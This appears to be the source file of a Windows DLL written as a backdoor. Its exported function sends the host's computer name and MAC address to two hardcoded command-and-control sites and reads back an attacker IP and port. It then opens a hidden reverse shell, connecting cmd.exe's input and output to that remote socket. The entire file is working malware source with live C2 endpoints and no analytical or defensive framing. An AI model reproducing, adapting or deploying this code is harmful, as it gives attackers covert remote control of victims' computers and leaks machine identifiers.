// Dll1.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#define CURL_STATICLIB

#include <iostream>
#include <algorithm>    // copy
#include <iterator>     // back_inserter
#include <regex>        // regex, sregex_token_iterator
#include <vector>
#include <curl\curl.h>
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <string>
#include <windowsx.h>
#include <strsafe.h>
#include <shlobj.h>
#include <Iphlpapi.h>
#include <Assert.h>
#pragma comment(lib, "iphlpapi.lib")
static char * PrintMACaddress(unsigned char MACData[])
{
	char smac[255];
	//printf("MAC Address: %02X-%02X-%02X-%02X-%02X-%02X\n", 
	//	MACData[0], MACData[1], MACData[2], MACData[3], MACData[4], MACData[5]);
	sprintf(smac, "%02X:%02X:%02X:%02X:%02X:%02X",
		MACData[0], MACData[1], MACData[2], MACData[3], MACData[4], MACData[5]);
	MessageBoxA(0, smac, "Hi", MB_ICONINFORMATION);
	return smac;

}
char smac[255];
char * GetMACaddress(void)
{
	
	IP_ADAPTER_INFO AdapterInfo[16];			// Allocate information for up to 16 NICs
	DWORD dwBufLen = sizeof(AdapterInfo);		// Save the memory size of buffer

	DWORD dwStatus = GetAdaptersInfo(			// Call GetAdapterInfo
		AdapterInfo,							// [out] buffer to receive data
		&dwBufLen);								// [in] size of receive data buffer
	assert(dwStatus == ERROR_SUCCESS);			// Verify return value is valid, no buffer overflow

	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;// Contains pointer to current adapter info
	do {
		if (strcmp(pAdapterInfo->GatewayList.IpAddress.String, "0.0.0.0"))
		{
			//return PrintMACaddress(pAdapterInfo->Address);	// Print MAC address
			sprintf(smac, "%02X:%02X:%02X:%02X:%02X:%02X",
				pAdapterInfo->Address[0], pAdapterInfo->Address[1], pAdapterInfo->Address[2], pAdapterInfo->Address[3], pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
			//MessageBoxA(0, smac, "Hi", MB_ICONINFORMATION);
			return smac;
		}


		//printf("\tGateway: \t%s\n", pAdapterInfo->GatewayList.IpAddress.String);
		pAdapterInfo = pAdapterInfo->Next;		// Progress through linked list
	} while (pAdapterInfo);						// Terminate if last adapter
}
static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}
void frevshell(PCSTR REMOTE_ADDR, PCSTR REMOTE_PORT);
std::wstring getComputerName() {
	wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
	DWORD cchBufferSize = sizeof(buffer) / sizeof(buffer[0]);
	if (!GetComputerNameW(buffer, &cchBufferSize))
		throw std::runtime_error("GetComputerName() failed.");
	return std::wstring(&buffer[0]);
}
extern "C" __declspec(dllexport) void   sysfunc()
{
	CURL *curl_handle;
	CURLcode res;
	std::vector<std::wstring> sites(2);
	//std::wstring sites[1];
	std::string readBuffer;
	std::wstring wsurl;
	std::string surl, stest, surlkill;
	std::string segment, sip, skill, sport;
	std::vector<std::string> seglist;

	sites[0] = L"http://paner.altervista.org/";
	sites[1] = L"http://config01.homepc.it/";
	curl_global_init(CURL_GLOBAL_ALL);
	curl_handle = curl_easy_init();
	for (int i = 0; i < 2; i++)
	{

		surl = "";
		wsurl = sites[i];
		wsurl.append(L"svc/wup.php?pc=");
		wsurl.append(getComputerName());
		surl.assign(wsurl.begin(), wsurl.end());
		//stest.append(GetMACaddress());
		//MessageBoxA(0, GetMACaddress(), "Hi", MB_ICONINFORMATION);
		surl.append("_"); surl.append(GetMACaddress()); surl.append("_v1");
		curl_easy_setopt(curl_handle, CURLOPT_URL, surl.c_str());
		curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, &readBuffer);
		curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
		res = curl_easy_perform(curl_handle);
		std::cout << readBuffer << std::endl;
		char *token = std::strtok((char *)readBuffer.c_str(), "||");
		std::vector<int> v;

		while (token != NULL) {
			v.push_back(std::strtol(token, NULL, 10));
			seglist.push_back(token);
			token = std::strtok(NULL, "||");
		}
		sip = seglist[1].substr(3);
		sport = seglist[2].substr(5);
		skill = seglist[3].substr(5);
		if (skill == "0")
		{
			frevshell(sip.c_str(), sport.c_str());
			surlkill = surl; surlkill.append("&kill=1");
			curl_easy_setopt(curl_handle, CURLOPT_URL, surlkill);
			curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
			res = curl_easy_perform(curl_handle);
		}
		//for (std::size_t i = 0; i < v.size(); ++i)
		//	std::cout << v[i] << std::endl;

	}
	curl_easy_cleanup(curl_handle);
	curl_global_cleanup();
	

}
void frevshell(PCSTR REMOTE_ADDR, PCSTR REMOTE_PORT)
{
	FreeConsole();
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
	ptr = result;
	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	//si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | CREATE_NEW_PROCESS_GROUP;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
}

